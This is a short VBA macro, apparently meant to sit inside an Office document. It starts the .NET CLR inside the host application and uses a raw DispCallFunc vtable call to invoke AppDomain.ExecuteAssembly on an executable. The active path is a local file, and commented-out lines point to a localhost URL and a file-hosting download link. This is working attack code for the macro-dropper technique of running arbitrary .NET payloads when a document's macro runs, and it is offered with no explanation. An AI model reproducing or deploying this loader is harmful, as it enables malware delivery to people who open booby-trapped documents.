Option Explicit

Private Declare PtrSafe Function DispCallFunc Lib "oleaut32.dll" (ByVal pv As LongPtr, ByVal ov As LongPtr, ByVal cc As Integer, ByVal vr As Integer, ByVal ca As Long, ByRef pr As Integer, ByRef pg As LongPtr, ByRef par As Variant) As Long

Sub Stg1()
    
    'Change the .NET version if required.
    '.NET 3.5 -> v2.0.50727
    '.NET 4.x -> v4.0.30319
    ThisDocument.VBProject.References.AddFromFile "C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscoree.tlb"
    ThisDocument.VBProject.References.AddFromFile "C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorlib.tlb"
    
    Call Stg2

End Sub

Sub Stg2()

    Dim url
    'url = "http://127.0.0.1:8180/HelloWorld.exe"
    'url = "https://uploadify.net/995a806bc3998884/HelloWorld.exe?download_token=c6acbc2e638c3b70690b7640499541b131c4580f7b0689de903f39800efd3d9b"
    url = "C:\HelloWorld.exe"
    
    Dim ICRHost As New mscoree.CorRuntimeHost
    Dim IDomain As AppDomain
    ICRHost.Start
    ICRHost.GetDefaultDomain IDomain
 
    Dim prgvt(0 To 1) As Integer
    Dim prgpvarg(0 To 1) As LongPtr
    
    prgvt(0) = VarType(CVar(url))
    prgpvarg(0) = VarPtr(url)

    Dim out: out = 0
    Dim ret As Variant
    
    prgvt(1) = VarType(CVar(out))
    prgpvarg(1) = VarPtr(out)
    
    'C#: AppDomain.ExecuteAssembly(url);
    Dim hr As Long
    hr = DispCallFunc(ObjPtr(IDomain), 51 * Len(prgpvarg(0)), 4, vbLong, 2, prgvt(0), prgpvarg(0), ret)
    
End Sub
